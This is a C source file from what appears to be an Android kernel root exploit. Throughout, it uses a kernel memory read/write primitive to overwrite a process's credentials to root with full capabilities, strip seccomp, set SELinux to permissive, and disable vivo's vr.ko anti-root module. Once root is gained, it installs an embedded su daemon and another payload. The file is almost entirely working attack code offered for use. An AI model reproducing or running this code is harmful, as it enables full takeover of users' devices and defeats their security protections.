#include "common.h"

int root_child_done;
uint8_t selinux_before = 0xff;
uint8_t selinux_after = 0xff;
uint32_t root_uid_before = 0xffffffff;
uint32_t root_uid_after = 0xffffffff;
uint64_t capable_head_before;
uint64_t capable_head_after;
uint64_t init_tasks_prev;
uint64_t last_task_guess;
int setgid_ret = -1;
int setuid_ret = -1;
int setenforce_ret = -1;
int setenforce_errno;
uint64_t current_task_addr;
uint64_t current_cred_addr;
uint64_t current_real_cred_addr;
uint64_t current_cred_security_addr;
uint64_t current_real_cred_security_addr;
uint32_t cred_sid_before = 0xffffffff;
uint32_t cred_sid_after = 0xffffffff;
uint32_t real_cred_sid_before = 0xffffffff;
uint32_t real_cred_sid_after = 0xffffffff;
uint32_t target_cred_osid = SELINUX_KERNEL_SID;
uint32_t target_cred_sid = SELINUX_KERNEL_SID;
uint32_t selinux_cred_blob_off = SELINUX_CRED_BLOB_OFF;
int task_walk_iters;
uint64_t task_walk_last_entry;
uint32_t task_walk_last_pid;
uint32_t task_walk_last_tgid;
uint32_t found_task_pid;
uint32_t found_task_tgid;
char found_task_comm[TASK_COMM_LEN + 1];
pid_t root_child_pid = -1;
int root_ready_pipe[2] = {-1, -1};
struct root_shared *root_shared;

int spawn_root_child(void) {
  int prot = PROT_READ | PROT_WRITE;
  int flags = MAP_SHARED | MAP_ANONYMOUS;
  root_shared = SYSCHK(mmap(NULL, sizeof(*root_shared), prot, flags, -1, 0));
  memset(root_shared, 0, sizeof(*root_shared));
  SYSCHK(pipe(root_ready_pipe));

  root_child_pid = SYSCHK(fork());
  if (root_child_pid == 0) {
    close(root_ready_pipe[0]);

    prctl(PR_SET_NAME, "ll_root_child");
    char ready = 1;
    SYSCHK(write(root_ready_pipe[1], &ready, sizeof(ready)));

    for (int i = 0; i < 30000; i++) {
      if (atomic_load(&root_shared->go)) {
        break;
      }
      usleep(1000);
    }
    if (!atomic_load(&root_shared->go)) {
      _exit(2);
    }

    struct root_report report;
    memset(&report, 0, sizeof(report));
    report.uid_before = getuid();
    errno = 0;
    report.setgid_ret = setgid(0);
    report.setgid_errno = errno;
    errno = 0;
    report.setuid_ret = setuid(0);
    report.setuid_errno = errno;
    report.uid_after = getuid();
    report.gid_after = getgid();
    report.euid_after = geteuid();
    report.egid_after = getegid();
    int enforce_fd = open("/sys/fs/selinux/enforce", O_WRONLY | O_CLOEXEC);
    if (enforce_fd >= 0) {
      ssize_t wrote = write(enforce_fd, "0", 1);
      report.setenforce_ret = wrote == 1 ? 0 : -1;
      report.setenforce_errno = wrote == 1 ? 0 : errno;
      close(enforce_fd);
    } else {
      report.setenforce_ret = -1;
      report.setenforce_errno = errno;
    }
    report.su_daemon_pid = -1;
    report.su_install_ret = 0;
    report.su_install_errno = (report.setuid_ret == 0) ? 0 : EPERM;
    report.wallpaper_ret = 0;
    report.wallpaper_errno = (report.setuid_ret == 0) ? 0 : EPERM;

    /*
     * Publish the core result to the parent NOW, before the optional installers
     * below. install_embedded_su()/install_embedded_wallpaper() fork+exec helper
     * binaries (chcon, restorecon, sh) and waitpid() on them with no timeout, and
     * kill system_server. On a BFU / encrypted or non-Pixel userland any of those
     * can block indefinitely, which used to leave root_shared->done == 0 and made
     * the parent log "done=0 root=0" even though uid 0 + SELinux permissive were
     * already achieved. Report first; do best-effort post-exploitation after.
     */
    root_shared->report = report;
    atomic_store(&root_shared->done, 1);

    if (report.setgid_ret == 0 && report.setuid_ret == 0) {
      errno = 0;
      report.su_install_ret = install_embedded_su(&report.su_daemon_pid);
      report.su_install_errno = errno;
      errno = 0;
      report.wallpaper_ret = install_embedded_wallpaper();
      report.wallpaper_errno = errno;
      /* Refresh for logging; parent may already have collected — done stays set. */
      root_shared->report = report;
    }
    _exit(report.uid_after == 0 ? 0 : 1);
  }

  close(root_ready_pipe[1]);

  char ready;
  ssize_t got = read(root_ready_pipe[0], &ready, sizeof(ready));
  return got == (ssize_t)sizeof(ready);
}

int collect_root_child(void) {
  if (!root_shared) {
    return 0;
  }
  atomic_store(&root_shared->go, 1);

  for (int i = 0; i < 30000; i++) {
    if (atomic_load(&root_shared->done)) {
      break;
    }
    usleep(1000);
  }
  if (!atomic_load(&root_shared->done)) {
    /* Diagnose why the child never reported. waitpid tells us exited/signaled
     * (a status change we haven't already reaped); it returns 0 while the child
     * is alive OR still stopped (that stop was already consumed by the freeze),
     * so also read /proc to get the live scheduler state and the last stage the
     * child code reached. */
    int status = 0;
    pid_t w = waitpid(root_child_pid, &status,
                      WNOHANG | WUNTRACED | WCONTINUED);
    char st_state = '?';
    char wchan[64] = {0};
    char syscall_line[96] = {0};
    char path[64];
    char buf[512];
    snprintf(path, sizeof(path), "/proc/%d/stat", root_child_pid);
    int f = open(path, O_RDONLY | O_CLOEXEC);
    if (f >= 0) {
      ssize_t n = read(f, buf, sizeof(buf) - 1);
      close(f);
      if (n > 0) {
        buf[n] = '\0';
        char *rp = strrchr(buf, ')'); /* comm can contain spaces/parens */
        if (rp && rp[1] == ' ') {
          st_state = rp[2]; /* R/S/D/T/t/Z/... */
        }
      }
    }
    snprintf(path, sizeof(path), "/proc/%d/wchan", root_child_pid);
    f = open(path, O_RDONLY | O_CLOEXEC);
    if (f >= 0) {
      ssize_t n = read(f, wchan, sizeof(wchan) - 1);
      if (n > 0) {
        wchan[n] = '\0';
      }
      close(f);
    }
    /* /proc/pid/syscall: "<nr> <arg0..5> <sp> <pc>", "running", or "-1 ...". The
     * leading nr pinpoints exactly which syscall the child is blocked in. */
    snprintf(path, sizeof(path), "/proc/%d/syscall", root_child_pid);
    f = open(path, O_RDONLY | O_CLOEXEC);
    if (f >= 0) {
      ssize_t n = read(f, syscall_line, sizeof(syscall_line) - 1);
      if (n > 0) {
        syscall_line[n] = '\0';
        char *nl = strchr(syscall_line, '\n');
        if (nl) {
          *nl = '\0';
        }
      }
      close(f);
    }
    pr_info("root child stalled done=0 go=%d waitpid=%d status=%08x"
            "%s%s%s%s termsig=%d stopsig=%d proc_state=%c wchan=%s syscall=[%s]\n",
            atomic_load(&root_shared->go), (int)w, status,
            WIFEXITED(status) ? " exited" : "",
            WIFSIGNALED(status) ? " signaled" : "",
            WIFSTOPPED(status) ? " stopped" : "",
            WIFCONTINUED(status) ? " continued" : "",
            WIFSIGNALED(status) ? WTERMSIG(status) : -1,
            WIFSTOPPED(status) ? WSTOPSIG(status) : -1, st_state, wchan,
            syscall_line);
    return 0;
  }

  struct root_report report = root_shared->report;
  root_uid_after = report.uid_after;
  setgid_ret = report.setgid_ret;
  setuid_ret = report.setuid_ret;
  setenforce_ret = report.setenforce_ret;
  setenforce_errno = report.setenforce_errno;
  waitpid(root_child_pid, NULL, 0);
  return report.uid_after == 0 && report.euid_after == 0 &&
         report.gid_after == 0 && report.egid_after == 0;
}

uint64_t find_task_by_tgid(int fd, uint32_t want_tgid) {
  uint64_t head = data_addr(INIT_TASK_TASKS);
  uint64_t canonical_head = canon_addr(INIT_TASK_TASKS);
  uint64_t entry = pipe_read64(fd, head);
  task_walk_iters = 0;
  task_walk_last_entry = 0;
  task_walk_last_pid = 0;
  task_walk_last_tgid = 0;

  for (int i = 0; i < 4096; i++) {
    task_walk_iters = i + 1;
    task_walk_last_entry = entry;
    if (entry == canonical_head || entry == head) {
      break;
    }
    if (!is_direct_ptr(entry)) {
      break;
    }

    uint64_t task = entry - TASK_TASKS_OFF;
    uint32_t pid = pipe_read32(fd, task + TASK_PID_OFF);
    uint32_t tgid = pipe_read32(fd, task + TASK_TGID_OFF);
    task_walk_last_pid = pid;
    task_walk_last_tgid = tgid;
    char comm[TASK_COMM_LEN + 1];
    memset(comm, 0, sizeof(comm));
    pipe_phys_read_data(fd, task + TASK_COMM_OFF, comm, TASK_COMM_LEN);

    if (tgid == want_tgid || pid == want_tgid) {
      found_task_pid = pid;
      found_task_tgid = tgid;
      memcpy(found_task_comm, comm, sizeof(found_task_comm));
      return task;
    }

    entry = pipe_read64(fd, task + TASK_TASKS_OFF);
  }

  return 0;
}

int patch_cred_identity(int fd, uintptr_t cred) {
  if (!is_direct_ptr(cred)) {
    return 0;
  }

  uint64_t zero_ids[4] = {0};
  if (!pipe_phys_write_data(fd, cred + CRED_UID_OFF, zero_ids, sizeof(zero_ids))) {
    return 0;
  }

  uint32_t securebits = 0;
  if (!pipe_phys_write_data(
      fd, cred + CRED_SECUREBITS_OFF, &securebits, sizeof(securebits))) {
    return 0;
  }

  uint64_t caps[CRED_CAP_WORDS] = {
    CAP_FULL, CAP_FULL, CAP_FULL, CAP_FULL, CAP_FULL,
  };
  if (!pipe_phys_write_data(fd, cred + CRED_CAPS_OFF, caps, sizeof(caps))) {
    return 0;
  }

  uint64_t caps_after[CRED_CAP_WORDS] = {0};
  if (!pipe_phys_read_data(
      fd, cred + CRED_CAPS_OFF, caps_after, sizeof(caps_after))) {
    return 0;
  }
  for (size_t i = 0; i < CRED_CAP_WORDS; i++) {
    if (caps_after[i] != CAP_FULL) {
      pr_info("root cap verify failed cred=%016llx idx=%zu got=%016llx want=%016llx\n",
              (unsigned long long)cred, i, (unsigned long long)caps_after[i],
              (unsigned long long)CAP_FULL);
      return 0;
    }
  }

  return 1;
}

int patch_cred_sid(int fd, uintptr_t cred) {
  uint64_t security = pipe_read64(fd, cred + CRED_SECURITY_OFF);
  if (!is_direct_ptr(security)) {
    pr_info("root bad cred security cred=%016llx security=%016llx\n",
            (unsigned long long)cred, (unsigned long long)security);
    return 0;
  }

  uint32_t sid_pair[2] = {
    target_cred_osid, target_cred_sid,
  };
  uintptr_t osid_addr =
    security + selinux_cred_blob_off + SELINUX_CRED_OSID_OFF;
  return pipe_phys_write_data(fd, osid_addr, sid_pair, sizeof(sid_pair));
}

int patch_cred_object(int fd, uintptr_t cred) {
  return patch_cred_identity(fd, cred) && patch_cred_sid(fd, cred);
}

static int patch_task_seccomp(int fd, uintptr_t task) {
  if (!is_direct_ptr(task)) {
    return 0;
  }

  uintptr_t flags_addr = task + TASK_THREAD_INFO_FLAGS_OFF;
  uintptr_t atomic_flags_addr = task + TASK_ATOMIC_FLAGS_OFF;
  uintptr_t seccomp_addr = task + TASK_SECCOMP_OFF;

  uint64_t flags_before = pipe_read64(fd, flags_addr);
  uint64_t atomic_before = pipe_read64(fd, atomic_flags_addr);
  uint32_t mode_before = pipe_read32(fd, seccomp_addr + SECCOMP_MODE_OFF);
  uint32_t count_before =
    pipe_read32(fd, seccomp_addr + SECCOMP_FILTER_COUNT_OFF);
  uint64_t filter_before = pipe_read64(fd, seccomp_addr + SECCOMP_FILTER_OFF);

  uint64_t flags_want = flags_before & ~(1ULL << TIF_SECCOMP_BIT);
  uint64_t atomic_want = atomic_before & ~(1ULL << PFA_NO_NEW_PRIVS_BIT);
  uint32_t zero32 = 0;
  uint64_t zero64 = 0;

  int ok = 1;
  if (flags_want != flags_before) {
    ok &= pipe_write64(fd, flags_addr, flags_want);
  }
  if (atomic_want != atomic_before) {
    ok &= pipe_write64(fd, atomic_flags_addr, atomic_want);
  }
  ok &= pipe_phys_write_data(
    fd, seccomp_addr + SECCOMP_MODE_OFF, &zero32, sizeof(zero32));
  ok &= pipe_phys_write_data(
    fd, seccomp_addr + SECCOMP_FILTER_COUNT_OFF, &zero32, sizeof(zero32));
  ok &= pipe_phys_write_data(
    fd, seccomp_addr + SECCOMP_FILTER_OFF, &zero64, sizeof(zero64));

  uint64_t flags_after = pipe_read64(fd, flags_addr);
  uint64_t atomic_after = pipe_read64(fd, atomic_flags_addr);
  uint32_t mode_after = pipe_read32(fd, seccomp_addr + SECCOMP_MODE_OFF);
  uint32_t count_after = pipe_read32(fd, seccomp_addr + SECCOMP_FILTER_COUNT_OFF);
  uint64_t filter_after = pipe_read64(fd, seccomp_addr + SECCOMP_FILTER_OFF);

  pr_info("root seccomp patched ok=%d flags=%016llx/%016llx "
          "atomic=%016llx/%016llx mode=%u/%u count=%u/%u "
          "filter=%016llx/%016llx\n",
          ok, (unsigned long long)flags_before,
          (unsigned long long)flags_after,
          (unsigned long long)atomic_before,
          (unsigned long long)atomic_after, mode_before, mode_after,
          count_before, count_after, (unsigned long long)filter_before,
          (unsigned long long)filter_after);

  int tif_clear = (flags_after & (1ULL << TIF_SECCOMP_BIT)) == 0;
  int nnp_clear = (atomic_after & (1ULL << PFA_NO_NEW_PRIVS_BIT)) == 0;
  return ok && tif_clear && nnp_clear && mode_after == 0 &&
         count_after == 0 && filter_after == 0;
}

/*
 * Defeat vivo's vr.ko anti-root for a single task (Option A: surgical de-tag).
 *
 * vr.ko's commit_creds probe tags every shell/app-origin task with two marker
 * bytes (task+VR_TAG_A_OFF / task+VR_TAG_B_OFF) and sets the syscall-tracepoint
 * work bit (VR_SYSCALL_TP_FLAG) in thread_info.flags so its sys_exit probe runs
 * on the task; that probe kills the task as soon as it holds euid/fsuid 0. We
 * escalate by patching cred memory directly (never re-entering commit_creds),
 * so the tag is never refreshed — clearing it here removes the task from vr's
 * enforcement for good.
 *
 * Both marker bytes MUST end up clear together: vr treats an out-of-sync pair
 * (one set, one clear) as tampering and kills on that alone, so we always write
 * both. Clearing the tracepoint bit additionally keeps the task off the syscall
 * slow-path. No-op / harmless on devices without vr.ko (bytes already 0).
 *
 * Guarded on VR_TAG_A_OFF: only targets whose target.h defines the vr tag
 * layout (currently the vivo PD2405) compile this in; every other target that
 * shares this root.c is unaffected.
 */
#ifdef VR_TAG_A_OFF
/* SIGSTOP the root child and block until it is actually stopped, so no syscall
 * of its executes while we patch cred/seccomp/vr state. Returns 1 if frozen. */
static int vr_freeze_child(pid_t pid) {
  if (pid <= 0) {
    return 0;
  }
  if (kill(pid, SIGSTOP) != 0) {
    pr_info("root vr freeze SIGSTOP failed pid=%d errno=%d\n", pid, errno);
    return 0;
  }
  for (int i = 0; i < 1000; i++) {
    int status = 0;
    pid_t w = waitpid(pid, &status, WUNTRACED | WNOHANG);
    if (w == pid && WIFSTOPPED(status)) {
      return 1;
    }
    if (w == pid && (WIFEXITED(status) || WIFSIGNALED(status))) {
      pr_info("root vr freeze child gone pid=%d status=%x\n", pid, status);
      return 0;
    }
    usleep(1000);
  }
  pr_info("root vr freeze timeout pid=%d\n", pid);
  return 0;
}

static void vr_unfreeze_child(pid_t pid) {
  if (pid > 0) {
    kill(pid, SIGCONT);
  }
}

static int patch_task_vr_tag(int fd, uintptr_t task) {
  if (!is_direct_ptr(task)) {
    return 0;
  }

  uint8_t tag_a_before = 0;
  uint8_t tag_b_before = 0;
  pipe_phys_read_data(fd, task + VR_TAG_A_OFF, &tag_a_before, sizeof(tag_a_before));
  pipe_phys_read_data(fd, task + VR_TAG_B_OFF, &tag_b_before, sizeof(tag_b_before));

  int ok = 1;

  /*
   * Clear the syscall-tracepoint work bit FIRST. That takes the task off the
   * sys_exit slow path so vr's probe stops running for it before we disturb the
   * two tamper-checked tag bytes (an out-of-sync pair is itself a kill). With
   * the child frozen this is belt-and-suspenders; without the freeze it is what
   * makes the byte writes below safe.
   */
  uintptr_t flags_addr = task + TASK_THREAD_INFO_FLAGS_OFF;
  uint64_t flags_before = pipe_read64(fd, flags_addr);
  uint64_t flags_want = flags_before & ~VR_SYSCALL_TP_FLAG;
  if (flags_want != flags_before) {
    ok &= pipe_write64(fd, flags_addr, flags_want);
  }

  uint8_t zero8 = 0;
  ok &= pipe_phys_write_data(fd, task + VR_TAG_A_OFF, &zero8, sizeof(zero8));
  ok &= pipe_phys_write_data(fd, task + VR_TAG_B_OFF, &zero8, sizeof(zero8));

  uint8_t tag_a_after = 0xff;
  uint8_t tag_b_after = 0xff;
  pipe_phys_read_data(fd, task + VR_TAG_A_OFF, &tag_a_after, sizeof(tag_a_after));
  pipe_phys_read_data(fd, task + VR_TAG_B_OFF, &tag_b_after, sizeof(tag_b_after));
  uint64_t flags_after = pipe_read64(fd, flags_addr);

  pr_info("root vr detag ok=%d tag_a=%u->%u tag_b=%u->%u flags=%016llx->%016llx\n",
          ok, tag_a_before, tag_a_after, tag_b_before, tag_b_after,
          (unsigned long long)flags_before, (unsigned long long)flags_after);

  return ok && tag_a_after == 0 && tag_b_after == 0 &&
         (flags_after & VR_SYSCALL_TP_FLAG) == 0;
}
/* Freeze retired: under adb the SIGSTOP left the child stuck in group-stop and
 * SIGCONT would not reliably resume it. patch_task_vr_tag()'s flag-first ordering
 * (clear 0x400 before the tamper-checked tag bytes) closes the race without it. */
#define VR_UNFREEZE_ON_FAIL() do {} while (0)
#else
#define VR_UNFREEZE_ON_FAIL() do {} while (0)
#endif /* VR_TAG_A_OFF */

#if defined(SYS_EXIT_TP_OFF) && defined(RVH_COMMIT_CREDS_TP_OFF)
#define VR_HAVE_NEUTRALIZE 1

/*
 * Collect up to `max` funcs[] entries of the tracepoint at `tp_image_addr` whose
 * .func lies OUTSIDE the kernel image [img_lo, img_hi) — i.e. module-region probe
 * callbacks (vr's live in vmalloc, below the image post-KASLR). Returns count.
 */
static int vr_collect_module_funcs(int fd, uintptr_t tp_image_addr,
                                    uint64_t img_lo, uint64_t img_hi,
                                    uint64_t *out, int max) {
  uint64_t funcs = pipe_read64(fd, data_addr(tp_image_addr) + TRACEPOINT_FUNCS_OFF);
  if (!is_direct_ptr(funcs)) {
    return 0;
  }
  int n = 0;
  for (int i = 0; i < 64 && n < max; i++) {
    uintptr_t slot = (uintptr_t)funcs + (uintptr_t)i * TRACEPOINT_FUNC_STRIDE;
    uint64_t func = pipe_read64(fd, slot + TRACEPOINT_FUNC_FUNC_OFF);
    if (func == 0) {
      break;
    }
    if (func < img_lo || func >= img_hi) {
      out[n++] = func;
    }
  }
  return n;
}

/* Return the linear address of the funcs[] slot whose .func == target, else 0. */
static uintptr_t vr_find_func_slot(int fd, uintptr_t tp_image_addr, uint64_t target) {
  uint64_t funcs = pipe_read64(fd, data_addr(tp_image_addr) + TRACEPOINT_FUNCS_OFF);
  if (!is_direct_ptr(funcs)) {
    return 0;
  }
  for (int i = 0; i < 64; i++) {
    uintptr_t slot = (uintptr_t)funcs + (uintptr_t)i * TRACEPOINT_FUNC_STRIDE;
    uint64_t func = pipe_read64(fd, slot + TRACEPOINT_FUNC_FUNC_OFF);
    if (func == 0) {
      break;
    }
    if (func == target) {
      return slot + TRACEPOINT_FUNC_FUNC_OFF;
    }
  }
  return 0;
}

/*
 * Globally disable vivo vr.ko's anti-root kill by redirecting its sys_exit
 * tracepoint probe (sub_8008) to the tracepoint's own probestub no-op. Data-only
 * write to a SLAB-resident funcs[] entry; no module memory or page tables are
 * touched. Fail-safe: patches only an entry that exactly matches vr's known
 * intra-.text delta from its commit_creds probe, else does nothing. Returns 1 if
 * a probe was neutralized. Best-effort/idempotent — safe to run when vr absent.
 */
int neutralize_vr(int fd) {
  if (!kaslr_done) {
    pr_info("vr neutralize skipped: kaslr not resolved\n");
    return 0;
  }
  uint64_t img_lo = kaslr_base;
  uint64_t img_hi = kaslr_base + VR_KERNEL_IMAGE_MAX;

  uint64_t probestub =
    pipe_read64(fd, data_addr(SYS_EXIT_TP) + TRACEPOINT_PROBESTUB_OFF);
  if (probestub < img_lo || probestub >= img_hi) {
    pr_info("vr neutralize: implausible probestub=%016llx base=%016llx "
            "(check SYS_EXIT_TP_OFF / TRACEPOINT_* offsets)\n",
            (unsigned long long)probestub, (unsigned long long)kaslr_base);
    return 0;
  }

  uint64_t cc_funcs[8];
  int nc = vr_collect_module_funcs(fd, RVH_COMMIT_CREDS_TP, img_lo, img_hi,
                                   cc_funcs, 8);
  for (int i = 0; i < nc; i++) {
    uint64_t expect = cc_funcs[i] - VR_COMMIT_TO_SYSEXIT_DELTA;
    uintptr_t slot = vr_find_func_slot(fd, SYS_EXIT_TP, expect);
    if (!slot) {
      continue;
    }
    uint64_t before = pipe_read64(fd, slot);
    int ok = pipe_write64(fd, slot, probestub);
    uint64_t after = pipe_read64(fd, slot);
    pr_info("vr neutralized: sys_exit probe slot=%016llx func %016llx->%016llx "
            "probestub=%016llx cc_func=%016llx ok=%d\n",
            (unsigned long long)slot, (unsigned long long)before,
            (unsigned long long)after, (unsigned long long)probestub,
            (unsigned long long)cc_funcs[i], ok);
    return ok && after == probestub;
  }

  pr_info("vr neutralize: no matching sys_exit probe (cc_module_funcs=%d) — "
          "vr absent, or SYS_EXIT_TP_OFF/RVH_COMMIT_CREDS_TP_OFF wrong\n", nc);
  return 0;
}
#endif /* SYS_EXIT_TP_OFF && RVH_COMMIT_CREDS_TP_OFF */

int install_android_root(int fd) {
  root_uid_before = getuid();

#ifdef VR_HAVE_NEUTRALIZE
  /*
   * Global vr.ko kill switch (Option B). Redirect vr's sys_exit tracepoint probe
   * to a no-op once, up front, so every task that later escalates — this exploit's
   * root child and any future su-daemon child — is safe regardless of tagging.
   * The per-task de-tag below (Option A) remains as belt-and-suspenders and covers
   * the case where the two symbol offsets have not been filled in yet.
   */
  neutralize_vr(fd);
#endif

  if (!spawn_root_child()) {
    pr_info("root spawn failed child=%d\n", root_child_pid);
    return 0;
  }

  uintptr_t selinux_addr = data_addr(SELINUX_ENFORCING);
  pipe_phys_read_data(fd, selinux_addr, &selinux_before, sizeof(selinux_before));
  selinux_cred_blob_off =
    pipe_read32(fd, data_addr(SELINUX_BLOB_SIZES));
  target_cred_osid = SELINUX_KERNEL_SID;
  target_cred_sid = SELINUX_KERNEL_SID;

  init_tasks_prev = pipe_read64(fd, data_addr(INIT_TASK_TASKS) + 8);
  if (!is_direct_ptr(current_task_addr)) {
    current_task_addr = 0;
  }

  if (!is_direct_ptr(init_tasks_prev)) {
    pr_info("root bad init_tasks_prev=%016llx\n",
            (unsigned long long)init_tasks_prev);
    return 0;
  }
  current_task_addr = init_tasks_prev - TASK_TASKS_OFF;
  last_task_guess = current_task_addr;

  found_task_pid = pipe_read32(fd, current_task_addr + TASK_PID_OFF);
  found_task_tgid = pipe_read32(fd, current_task_addr + TASK_TGID_OFF);
  memset(found_task_comm, 0, sizeof(found_task_comm));
  pipe_phys_read_data(
      fd, current_task_addr + TASK_COMM_OFF, found_task_comm, TASK_COMM_LEN);
  if (found_task_tgid != (uint32_t)root_child_pid) {
    current_task_addr = find_task_by_tgid(fd, (uint32_t)root_child_pid);
    if (!is_direct_ptr(current_task_addr)) {
      pr_info("root task walk failed want=%u iters=%d last=%016llx pid=%u tgid=%u\n",
              (uint32_t)root_child_pid, task_walk_iters,
              (unsigned long long)task_walk_last_entry, task_walk_last_pid,
              task_walk_last_tgid);
      return 0;
    }
  }

#ifdef VR_TAG_A_OFF
  /*
   * vivo vr.ko anti-root: strip vr's per-task tag BEFORE granting root creds.
   * vr's sys_exit probe kills a tagged task the instant it holds euid/fsuid 0, so
   * the tag must be gone before patch_cred_object() below flips the ids.
   * patch_task_vr_tag() clears the 0x400 tracepoint bit first, taking the task
   * off the sys_exit slow path so the probe stops firing for it before the two
   * tamper-checked tag bytes change. Best-effort; no-op on non-vr devices.
   */
  if (!patch_task_vr_tag(fd, current_task_addr)) {
    pr_info("root vr detag incomplete task=%016llx (continuing)\n",
            (unsigned long long)current_task_addr);
  }
#endif

  uintptr_t real_cred_slot = current_task_addr + TASK_REAL_CRED_OFF;
  current_real_cred_addr = pipe_read64(fd, real_cred_slot);
  current_cred_addr = pipe_read64(fd, current_task_addr + TASK_CRED_OFF);
  uintptr_t cred_security_slot = current_cred_addr + CRED_SECURITY_OFF;
  uintptr_t real_security_slot = current_real_cred_addr + CRED_SECURITY_OFF;
  current_cred_security_addr = pipe_read64(fd, cred_security_slot);
  current_real_cred_security_addr = pipe_read64(fd, real_security_slot);
  uintptr_t sid_off = selinux_cred_blob_off + SELINUX_CRED_SID_OFF;
  if (is_direct_ptr(current_cred_security_addr)) {
    uintptr_t sid_addr = current_cred_security_addr + sid_off;
    cred_sid_before = pipe_read32(fd, sid_addr);
  }
  if (is_direct_ptr(current_real_cred_security_addr)) {
    uintptr_t sid_addr = current_real_cred_security_addr + sid_off;
    real_cred_sid_before = pipe_read32(fd, sid_addr);
  }
  uint64_t cred_caps_before[CRED_CAP_WORDS] = {0};
  uint64_t real_caps_before[CRED_CAP_WORDS] = {0};
  pipe_phys_read_data(
      fd, current_cred_addr + CRED_CAPS_OFF, cred_caps_before,
      sizeof(cred_caps_before));
  pipe_phys_read_data(
      fd, current_real_cred_addr + CRED_CAPS_OFF, real_caps_before,
      sizeof(real_caps_before));
  if (!patch_cred_object(fd, current_cred_addr)) {
    pr_info("root patch cred failed cred=%016llx\n",
            (unsigned long long)current_cred_addr);
    VR_UNFREEZE_ON_FAIL();
    return 0;
  }
  if (current_real_cred_addr != current_cred_addr &&
      !patch_cred_object(fd, current_real_cred_addr)) {
    pr_info("root patch real_cred failed real=%016llx\n",
            (unsigned long long)current_real_cred_addr);
    VR_UNFREEZE_ON_FAIL();
    return 0;
  }

  if (!patch_task_seccomp(fd, current_task_addr)) {
    pr_info("root patch seccomp failed task=%016llx\n",
            (unsigned long long)current_task_addr);
    VR_UNFREEZE_ON_FAIL();
    return 0;
  }

  uint32_t cred_uid_after = pipe_read32(fd, current_cred_addr + CRED_UID_OFF);
  uint32_t real_uid_after =
    pipe_read32(fd, current_real_cred_addr + CRED_UID_OFF);
  uint64_t cred_caps_after[CRED_CAP_WORDS] = {0};
  uint64_t real_caps_after[CRED_CAP_WORDS] = {0};
  pipe_phys_read_data(
      fd, current_cred_addr + CRED_CAPS_OFF, cred_caps_after,
      sizeof(cred_caps_after));
  pipe_phys_read_data(
      fd, current_real_cred_addr + CRED_CAPS_OFF, real_caps_after,
      sizeof(real_caps_after));
  if (is_direct_ptr(current_cred_security_addr)) {
    uintptr_t sid_addr = current_cred_security_addr + sid_off;
    cred_sid_after = pipe_read32(fd, sid_addr);
  }
  if (is_direct_ptr(current_real_cred_security_addr)) {
    uintptr_t sid_addr = current_real_cred_security_addr + sid_off;
    real_cred_sid_after = pipe_read32(fd, sid_addr);
  }
  pr_info("root cred patched uid=%u/%u sid=%u/%u\n", cred_uid_after,
          real_uid_after, cred_sid_after, real_cred_sid_after);
  pr_info("root caps patched cred eff=%016llx/%016llx prm=%016llx/%016llx "
          "amb=%016llx/%016llx bset=%016llx/%016llx real_eff=%016llx/%016llx\n",
          (unsigned long long)cred_caps_before[CRED_CAP_EFFECTIVE],
          (unsigned long long)cred_caps_after[CRED_CAP_EFFECTIVE],
          (unsigned long long)cred_caps_before[CRED_CAP_PERMITTED],
          (unsigned long long)cred_caps_after[CRED_CAP_PERMITTED],
          (unsigned long long)cred_caps_before[CRED_CAP_AMBIENT],
          (unsigned long long)cred_caps_after[CRED_CAP_AMBIENT],
          (unsigned long long)cred_caps_before[CRED_CAP_BSET],
          (unsigned long long)cred_caps_after[CRED_CAP_BSET],
          (unsigned long long)real_caps_before[CRED_CAP_EFFECTIVE],
          (unsigned long long)real_caps_after[CRED_CAP_EFFECTIVE]);

  uint8_t permissive = 0;
  int selinux_direct_ok =
    pipe_phys_write_data(fd, selinux_addr, &permissive, sizeof(permissive));
  uint8_t selinux_mid = 0xff;
  pipe_phys_read_data(fd, selinux_addr, &selinux_mid, sizeof(selinux_mid));
  pr_info("root selinux direct write ok=%d %u->%u\n", selinux_direct_ok,
          selinux_before, selinux_mid);

  capable_head_before = pipe_read64(fd, data_addr(SECURITY_CAPABLE_HEAD));
  root_child_done = collect_root_child();
  struct root_report report;
  memset(&report, 0, sizeof(report));
  if (root_shared) {
    report = root_shared->report;
  }
  capable_head_after = pipe_read64(fd, data_addr(SECURITY_CAPABLE_HEAD));
  pipe_phys_read_data(fd, selinux_addr, &selinux_after, sizeof(selinux_after));
  pr_info("root child result done=%d uid_after=%u setgid=%d/%d setuid=%d/%d "
          "setenforce=%d/%d su=%d/%d daemon=%d wallpaper=%d/%d selinux=%u->%u "
          "cap=%016llx/%016llx\n",
          root_child_done, root_uid_after, report.setgid_ret,
          report.setgid_errno, report.setuid_ret, report.setuid_errno,
          setenforce_ret, setenforce_errno, report.su_install_ret,
          report.su_install_errno, report.su_daemon_pid, report.wallpaper_ret,
          report.wallpaper_errno,
          selinux_before, selinux_after,
          (unsigned long long)capable_head_before,
          (unsigned long long)capable_head_after);
  return root_child_done && selinux_after == 0;
}
